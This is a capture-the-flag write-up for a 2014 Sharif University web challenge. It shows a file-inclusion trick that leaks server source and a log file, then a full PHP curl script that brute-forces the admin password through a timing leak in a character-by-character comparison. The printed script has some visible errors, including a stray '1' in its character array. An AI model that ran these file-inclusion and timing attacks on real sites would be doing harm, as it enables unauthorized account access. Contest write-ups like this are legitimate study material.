# Sharif University Quals CTF 2014: Birthday of Website's Admin

**Category:** Web
**Points:** 400 + 80
**Solves** 0
**Description:**

> This website
> <http://ctf.sharif.edu:16481/login.php>
> is more secure than what you may think :)
>
> Flag is SHA1(Birthday of website's admin, formatted as YYYYMMDD).

## Write-up

Investigating all parts of the site, you'll see that the root page includes two iframes. Each iframe sends a request to news.php with a parameter "title". This parameters seems interesting. Specially, when it is modified, the server rejects by sending an empty response.

Trying some known files: **index.php login.php ../index.php ../../../../../../etc/passwd**; but no success.

Maybe something, e.g. an extension, is concatenated. Unfortunately, **index.php%00** does not work, but, yes, **index.php%20** works!

Lets see the source code of **login.php** via **http://ctf.sharif.edu:16481/news.php?title=login.php%20 **:
```php
<?php
session_start();
if (isset ($_SESSION['login_status']) and $_SESSION['login_status'] === 'authenticated') { // already logged in
  session_write_close ();
  header('Location: /profile.php', true, 303);
  exit (0);
}
$anyerror = false;
if (isset($_POST['action']) && $_POST['action'] === 'login') {
  define ('SAFTY_CHECK', true);
  include 'internals/log.php';
  include 'internals/db.php';
  $useragent=md5($_SERVER['HTTP_USER_AGENT']);
  $username=$_POST['username'];
  $password=$_POST['password'];
  $expected_password = db_retreive_password ($username);
  $anyerror = is_null ($expected_password) || $anyerror;
  $anyerror = strlen ($username) < 3 || $anyerror;
  $anyerror = strlen ($username) > 20 || $anyerror;
  $anyerror = strlen ($password) < 3 || $anyerror;
  $anyerror = strlen ($password) > 50 || $anyerror;
  if ($anyerror === false) {
    check_for_log_rotation ('9cccf42e43cd2eb379259dba5077b1a7.log');
    mylog ('9cccf42e43cd2eb379259dba5077b1a7.log', $useragent, 'checking password');
    for ($i = 0; $i < strlen ($expected_password) and $i < strlen ($password); $i = $i + 1) {
      if (substr ($password, $i, 1) != substr ($expected_password, $i, 1)) { // mismatch
        $anyerror = true;
        break;
      }
    }
    if (strlen ($expected_password) != strlen ($password)) {
      $anyerror = true;
    }
    if ($anyerror) {
      mylog ('9cccf42e43cd2eb379259dba5077b1a7.log', $useragent, 'wrong password');
    } else {
      mylog ('9cccf42e43cd2eb379259dba5077b1a7.log', $useragent, 'correct password');
      $_SESSION['login_status'] = 'authenticated';
      $_SESSION['username'] = $username;
      session_write_close ();
      header('Location: /profile.php', true, 303); // <http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html#sec10.3.4>;
      exit (0);
    }
  }
}
session_write_close ();
?>
```

There is a log file named **9cccf42e43cd2eb379259dba5077b1a7.log** which seems interesting.

Fetching **http://ctf.sharif.edu:16481/news.php?title=9cccf42e43cd2eb379259dba5077b1a7.log%20**, you will see the log file.

```
The log file is rotated. previous logs are moved to 9cccf42e43cd2eb379259dba5077b1a7.log.backup-1411770914 file.
1411770914.5129 | d41d8cd98f00b204e9800998ecf8427e | checking password
1411770914.513 | d41d8cd98f00b204e9800998ecf8427e | wrong password
1411770914.5334 | fa06a7c9d42ae5b386feae5b01f48a3f | checking password
1411770914.5335 | fa06a7c9d42ae5b386feae5b01f48a3f | wrong password
1411770915.7109 | d41d8cd98f00b204e9800998ecf8427e | checking password
1411770915.711 | d41d8cd98f00b204e9800998ecf8427e | wrong password
1411770915.7178 | 8efa52fbb9c4c46940e54b0dae76d8ba | checking password
1411770915.7179 | 8efa52fbb9c4c46940e54b0dae76d8ba | wrong password
1411770916.1378 | fa06a7c9d42ae5b386feae5b01f48a3f | checking password
1411770916.1379 | fa06a7c9d42ae5b386feae5b01f48a3f | wrong password
1411770917.1523 | 8efa52fbb9c4c46940e54b0dae76d8ba | checking password
...
```
It contains log time, the md5 of user-agent, and the log string. So what? After some investigation, you will notice that the password checking code is interesting:
```php
    for ($i = 0; $i < strlen ($expected_password) and $i < strlen ($password); $i = $i + 1) {
      if (substr ($password, $i, 1) != substr ($expected_password, $i, 1)) { // mismatch
        $anyerror = true;
        break;
      }
    }
    if (strlen ($expected_password) != strlen ($password)) {
      $anyerror = true;
    }
```

It has a time-leackage vulnerability but needs a highly-accurate time sampling. The logs' timestamps help now.

The strategy is as follows:
* Bruteforce the password by a script.
* To guess position 1, try all alphanumeric characters (first guess) and monitor the checking time by fetching the log and extracting your latest logs.
* The md5 of user agent now determines your own logs between the others.
* Each letter which consumes more processing time is the right one.
* Then, proceed to the second letter and so on.
* Be careful that passwords shorter than 3 characters are not processed at all, and it flats the processing time. Choose a dummy three-letter password (for example, " ") and guess the first position.
* Also be aware that a non-existing username also breaks this process. So, enter "admin" as the username from the beginning.

The following script will do this.
```php
<?php
	define('REPEAT_NUM', 3);

	// create curl resource 
	$ch = curl_init(); 

	$useragent = 'mymymyuseragent';

	//return the transfer as a string 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 

	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch,CURLOPT_ENCODING , 'gzip');

	curl_setopt($ch, CURLOPT_COOKIESESSION, true);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.jar');
	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.data');

	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'User-Agent: $useragent'
	));

	$charset = array('0', '1', '2', '3', 1'4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f',/*
		'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
		'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S',
		'T', 'U', 'V', 'W', 'X', 'Y', 'Z'*/);

	$pass = '   ';

	for ($ind = 0; $ind < 50; $ind++)
	{
		echo 'PASS (so far): $pass\n';

		$choices_table = array();
		$choices_sum  = 0;

		foreach ($charset as $val)
		{
			$repeats_sum = 0;
			for ($repeat = 0; $repeat < REPEAT_NUM; $repeat++)
			{
				// try login
				$pass[$ind] = $val;

				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=login&username=admin&password=$pass');

				curl_setopt($ch, CURLOPT_URL, 'http://.../login.php');
				$output = curl_exec($ch); 
				if ($output === false)
					die('CURL ERROR: ' . curl_error($ch) . '\n\n');

				// check time in logs
				curl_setopt($ch, CURLOPT_POST, 0);

				curl_setopt($ch, CURLOPT_URL, 'http://.../news.php?title=9cccf42e43cd2eb379259dba5077b1a7.log%20');
				$output = curl_exec($ch); 
				if ($output === false)
					die('CURL ERROR: ' . curl_error($ch) . '\n\n');

				$logs = explode('\n', $output);
				$mylogs = array_values(preg_grep('/' . md5($useragent) . '/', $logs));

				if (sizeof($mylogs) == 0)
					die('LOG OUTPUT: $output\n\n');
				
				sscanf($mylogs[sizeof($mylogs)-2], '%f', $start);
				sscanf($mylogs[sizeof($mylogs)-1], '%f', $end);
				$time = round($end * 10000 - $start * 10000);

				$repeats_sum += $time;
			}

			$avgtime = (float)$repeats_sum / REPEAT_NUM;
			$choices_table[$val] = $avgtime;
			echo 'choices_table[$val] = $avgtime\n';
			$choices_sum += $avgtime;
		}

		$avgtime = (float)$choices_sum / sizeof($charset);
		echo '\navgtime=$avgtime\n\n';

		arsort($choices_table);
		
		foreach($choices_table as $letter => $value)
			break;

		if ($value - $avgtime < 0.5)
			die('no noticeable difference\n\n');

		$pass[$ind] = $letter;
	}

	curl_close($ch);
?>
```
Once the password is revealed, login and obtain the birthday of admin.


## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/36/>
